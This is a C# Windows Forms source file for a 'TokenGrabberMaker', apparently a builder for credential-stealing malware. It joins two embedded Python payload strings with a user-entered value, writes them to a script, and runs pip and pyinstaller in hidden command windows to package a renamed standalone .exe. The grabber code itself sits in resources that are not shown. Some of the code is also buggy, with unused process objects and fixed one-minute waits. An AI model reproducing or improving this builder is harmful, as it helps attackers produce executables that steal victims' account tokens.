using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Diagnostics;
using System.IO;

namespace TokenGrabberMaker
{
    public partial class Form1 : Form
    {
        string first = TokenGrabberMaker.Properties.Resources.First;
        string second = TokenGrabberMaker.Properties.Resources.Second;

        public Form1()
        {
            InitializeComponent();
            label1.Visible = false;
        }

        private async void button1_Click(object sender, EventArgs e)
        { 
            string fullString = first + " '" + textBox1.Text + "'" + "\n" + second;
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/k pip install pyinstaller";
            process.StartInfo = startInfo;
            process.Start();
            textBox1.Visible = false;
            button1.Visible = false;
            label1.Visible = true;
            textBox2.Visible = false;
            await wait(60000);
            string fileName = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) + "/temp.py";
            if (File.Exists(fileName))
            {
                File.Delete(fileName);
            }
            using (FileStream fs = File.Create(fileName))
            {   
                Byte[] title = new UTF8Encoding(true).GetBytes(fullString);
                fs.Write(title, 0, title.Length);
            }
            System.Diagnostics.Process process1 = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo1 = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/k pyinstaller --onefile " + fileName;
            process.StartInfo = startInfo;
            process.Start();
            await wait(60000);
            string directory = Path.GetDirectoryName(fileName);
            File.Delete(directory + "/temp.spec");
            File.Delete(directory + "/temp.py");
            if (Directory.Exists(directory + "/output/"))
            {
                if (File.Exists(directory + "/output/" + textBox2.Text + ".exe"))
                {
                    File.Delete(directory + "/output/" + textBox2.Text + ".exe");
                    await wait(1000);
                    File.Move(directory + "/dist/temp.exe", directory + "/output/" + textBox2.Text + ".exe");
                }
                else
                {
                    await wait(1000);
                    File.Move(directory + "/dist/temp.exe", directory + "/output/" + textBox2.Text + ".exe");
                }
            }
            else
            {
                Directory.Move(@"" + directory + "/dist/", @"" + directory + "/output/");
                await wait(1000);
                File.Move(directory + "/output/temp.exe", directory + "/output/" + textBox2.Text + ".exe");
            }
            textBox1.Text = "Your EXE is located at '" + directory + "/output/" + textBox2.Text + ".exe'";
            textBox1.Visible = true;
            button1.Visible = true;
            textBox2.Visible = true;
            textBox2.Text = "File Name";
            label1.Visible = false;
        }

        async Task wait(int time)
        {
            await Task.Delay(time);
        }

        void DeleteFolder(string directory)
        {
            string[] files = Directory.GetFiles(directory);
            foreach (string file in files)
            {
                File.Delete(file);
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            
        }
    }
}
